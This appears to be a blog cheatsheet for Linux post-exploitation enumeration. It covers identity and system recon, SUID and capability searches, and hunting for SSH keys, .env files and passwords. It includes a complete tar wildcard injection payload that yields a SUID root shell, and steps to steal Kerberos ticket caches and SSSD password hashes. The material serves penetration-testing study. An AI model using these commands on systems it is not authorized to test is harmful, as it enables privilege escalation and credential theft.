---
title: "Linux Enum"
date: 2026-02-14 00:00:00 +0530
categories: [Cheatsheet]
tags: [linux, Linux Enum]
platform: Cheatsheet
author: 0xmr
image: /assets/img/posts/linux.webp
---

### Linux Quick Enum
> I am creating a simple Quick recon check list for linux environment for Post Exploitation.

## Ready to start
```bash
whoami
id
groups
sudo -l
sudo -v
crontab -l
cat /etc/crontab
ls -la /
```

# System & Identity
```bash
id                        # User’s identity information
hostname or hostnamectl   # Host Computer Details
whoami                    # who are you !
uname -a                  # Display system information
sudo -l                   # which files you can run as root
sudo -V                   # sudo version Exploit
cat /etc/os-release       # Os Details for kernal Exploit
uptime                    # Shows how long the system has been runningnet stats workstation
last -n 5                         # shows the login history of last 5 users.
cat /etc/passwd | grep -i 'sh$'   # list users
```

# Quick files to Check
```bash
ls -la /etc/systemd/system
ls -la /etc/cron.d/
cat /etc/resolv.conf
/usr/bin/env   or  /usr/bin/printenv
cat /etc/*-release
cat /etc/passwd
cat /etc/sudoers
/usr/bin/w or w     # show Current logins
last -n 5           # show last 5 logins
```


# Processes & Runtime
```bash
ps auxf
ps -ef --forest
```


# Network & listeners
```bash
ss -tlnp             
netstat -tunlp
ip a
ip addr show
ip route show            # show Routes in Linux
route print              # show Routes in Windows

cat /etc/resolv.conf     # check DNS configuration in Linux
ipconfig /all            # check DNS configuration in Windows
```


# SUID's  Files
>  Special file permissions in Linux that allow users to execute files with the permissions of the file's owner.

```bash
# Important !
find / -perm -4000 2> /dev/null | xargs ls -lah

# Common !
find / -type f -perm -4000 2>/dev/null
find / -perm -4000 -type f -ls 2>/dev/null

# Extract full Detail's
find / -type f -perm -4000 -ls 2>/dev/null |grep -i 'root'
find / -type f -perm -4000 -user <Username Here> 2>/dev/null

# Custom !
find / -type f -a \( -perm -u+s -o -perm -g+s\) -exec ls -l {} \; 2> /dev/null
```


# Capabilities
```bash
getcap -r / 2>/dev/null 
```


# SSH & .env  Files
```bash
env
printenv
cat /proc/$$/environ


find / -type f \( -name "*id_rsa*" -o -name "*id_dsa*" -o -name "*id_ecdsa*" -o -name "*id_ed25519*" -o -name "*authorized_keys*" -o -name "*ssh_host*" -o -name ".env"  \) 2>/dev/null
```


# Running Database
```bash
# Check Running Databases
(systemctl list-units --type=service; ss -tulnp) 2>/dev/null | grep -Ei 'mysql|mariadb|postgresql|mssql|3306|5432|1433'
```


# Config Files
```bash
# Custom extension file search
find / -type f -name "*.<Extension Name>" 2>/dev/null

# Search Whole file system
find / -type f \( -name "*.xml" -o -name "*.db" -o -name "*.sql" -o -name "*.config" \) 2>/dev/null

# Specific Paths /opt /etc /home /var
find /opt /var /home /etc -type f \( -name "*.xml" -o -name "*.db" -o -name "*.sql" -o -name "*.config" \) 2>/dev/null
```


# Password Finding's
```bash
# Custom string search
grep -ri --include="*.<Extension>" -n "<String>" <Directory> 2>/dev/null

# Password string search in /opt
grep -ri --include="*.xml" -n "Password" /opt 2>/dev/null
```

# Kernal Exploitation
```bash
# Linux kernal Exploitation
------> linux kernal exploitation <-------
=> uname -a
=> file /bin/bash
=> cat /etc/*-release

# searchsploit <linux version>
# search on exploitdb
# Needs :- which gcc cc tar unzip
```

# CronTab's
> Crontab file is the system-wide crontab used to schedule system-level tasks in Linux

```bash
 # Checking Running Jobs
 cat /etc/crontab

 # Writeable Cron Jobs
 # Writeable Cron Jobs Dependency (Files, python library, config files...)
```
> Adding soon........!!!

# Wildcard Priv. Esc
### Tar Wildcard Injection
```bash
# DETECTION
cat /etc/cron.d/Cron_Name_Here
# * * * * * root cd /opt/backups && tar czf /var/backups/uploads.tgz *
#                                                                    ^
#                                                runs as root + wildcard in writable directory

# EXPLOITATION
cd /opt/backups
# payload: creates SUID bash
echo 'cp /bin/bash /tmp/bash && chmod +s /tmp/bash' > shell.sh         
touch -- '--checkpoint=1'                        # creates a file named --checkpoint=1
touch -- '--checkpoint-action=exec=sh shell.sh'  # creates a file named --checkpoint-action=exec=sh shell.sh

# Wait for cron to run, then:
/tmp/bash -p        # -p preserves root effective UID

# BEHIND THE SCENES
# Shell expands * into all filenames before tar runs, so tar sees:
tar czf /var/backups/uploads.tgz --checkpoint=1 --checkpoint-action=exec=sh shell.sh
#                                 ↑ these are actually filenames, but tar treats them as real flags
#                                   --checkpoint-action tells tar to execute shell.sh as root
```

# Automation
> Linux Smart Enumeration Script [lse](https://github.com/diego-treitos/linux-smart-enumeration/tree/master)

- Level 1
```bash
./lse.sh -l 1
```
- Level 2
```bash
./lse.sh -l 2
```

> Linepeass [Peass-NG](https://github.com/peass-ng/PEASS-ng/tree/master)

- Standard Level
```bash
./linpeas.sh
```

> Pspy [pspy](https://github.com/DominicBreuker/pspy/releases)
```bash
chmod +x pspy64
./pspy64
```

> Deepce  [Deepce](https://github.com/stealthcopter/deepce)

```bash
wget https://github.com/stealthcopter/deepce/raw/main/deepce.sh
chmod +x deepce.sh
./deepce.sh
```
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
# Credential Access

```bash
# Reused Passwords
# Credentials from configuration files
# Credentials from local database files
# Credentials from Bash History
# ssh file and Environment variables
# sudo Access
# Group Privilleges (Docker, LXD, etc)
```

----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
# Misconfiguration

```bash
# Immediate System Identity
# SUID, SGID Files
# Intersting Capabilities on Binary
# Credential Access Files
# Review Internal Ports & Services
# Writing Path ($PATH Hijacking)
# LD_PRELOAD and LD_PRELOAD set in /etc/sudoers
# Kernel Exploits (Last Resort)
# Automation Tools (lse.sh, linpeass.sh, linEnum, pspy64, linux-exploit-suggester.sh, linux-privesc-check.sh)

# Active Directory Files
# Proc Files
```

----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------


# Active Directory Files
```bash
# Kerberos ticket cache
ls /tmp/krb5cc_*
# Read ticket
klist -c /tmp/krb5cc_1000

cp /tmp/krb5cc_1000 /tmp/found.ccache
export KRB5CCNAME="/tmp/found.ccache"

# SSSD cached credentials
ls /var/lib/sss/db/
# Contains cached password hashes
python3 sssd2hashcat.py /var/lib/sss/db/cache_corp.local.ldb
```
```bash
===================================================================================
Active Directory:- keytab , config 
===================================================================================
+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
find /etc -type f \( -name "*.keytab" -o -name "*.config" \) 2>/dev/null
+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
Files:-

/etc/krb5.keytab                               # Kerberos keytab file (sensitive!)
/etc/krb5.conf                                 # Kerberos configuration
/etc/krb5kdc/kdc.conf                          # KDC configuration
/var/lib/krb5kdc/principal                     # Kerberos principal database
/etc/sssd/sssd.conf                            # SSSD configuration (LDAP/AD)
/etc/ldap/ldap.conf                            # LDAP configuration
/etc/openldap/ldap.conf                        # OpenLDAP configuration
==========================================================================================================================================================================================================
find /etc /opt /var/lib -type f \( -iname "krb5.conf" -o -iname "*.keytab" -o -iname "sssd.conf" -o -iname "ldap.conf" -o -iname "nslcd.conf" -o -iname "realmd.conf" -o -iname "smb.conf" \) 2>/dev/null
==========================================================================================================================================================================================================
```


# Proc Files:-
```bash
==================================================================================
Proc Files:- PID's , Version, arp, environ , cmdline , tcp , dev , mounts
==================================================================================
Files:-

/proc/version                # kernel version
/proc/net/dev                # show all connected interfaces (eth0, tun0, docker)
/proc/net/tcp                # check for open ports (Grab a :hex number and convert into decimal number).
/proc/self/environ           # env variables
/proc/*/environ               
/proc/$$/environ             # current running process  cat /proc/$$/environ | tr '\0' '\n'
/proc/self/cmdline           # current running process
/proc/*/cmdline 
/proc/cmdline
/proc/mounts                 # grep the nfs share info
/proc/net/arp                # IP and MAC Address of Connected Devices
```



#### More thinks Coming soon...
